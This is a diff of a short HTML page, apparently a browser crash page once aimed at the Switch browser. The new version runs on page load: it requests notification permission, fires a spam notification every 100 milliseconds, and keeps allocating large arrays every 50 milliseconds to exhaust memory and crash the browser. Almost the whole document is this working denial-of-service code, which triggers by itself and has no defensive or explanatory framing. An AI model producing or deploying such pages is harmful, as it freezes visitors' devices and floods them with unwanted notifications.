@@ -3,31 +3,47 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Switch Browser Crash</title>
+    <title>Crash Test</title>
     <script>
-        function crashBrowser() {
-            let arr = [];
-            while (true) {
-                arr.push(new Array(1000000).fill("X")); // Fills memory quickly
+        // Request permission for notifications
+        function requestNotificationPermission() {
+            if (Notification.permission !== 'granted') {
+                Notification.requestPermission().then(permission => {
+                    if (permission !== 'granted') {
+                        alert("Permission denied! Cannot send notifications.");
+                    }
+                });
             }
         }
 
-        // Function to force a page refresh
-        function restartBrowser() {
-            setTimeout(function() {
-                location.reload(); // Reload the page to simulate restart
-            }, 3000); // Delay of 3 seconds to allow crash before reload
+        // Function to spam notifications
+        function spamNotifications() {
+            setInterval(() => {
+                if (Notification.permission === 'granted') {
+                    new Notification("This is a spam notification!");
+                }
+            }, 100); // Every 100 milliseconds
         }
 
-        // Calling both functions
+        // Function to fill memory and cause excessive memory usage
+        function fillMemory() {
+            let arr = [];
+            setInterval(() => {
+                arr.push(new Array(1000000).fill("X")); // Fills memory quickly
+                console.log("Memory filled", arr.length); // Logging to track memory growth
+            }, 50); // Pushes a large array every 50ms
+        }
+
+        // Start the process when the page loads
         window.onload = function() {
-            crashBrowser();
-            restartBrowser();
+            requestNotificationPermission();
+            spamNotifications();
+            fillMemory(); // Start filling memory
         };
     </script>
 </head>
 <body>
-    <h1>Browser Crash Test</h1>
-    <p>This page may cause your Switch browser to freeze and restart.</p>
+    <h1>Crash Test</h1>
+    <p>This page will spam notifications and fill memory to cause a potential crash.</p>
 </body>
 </html>
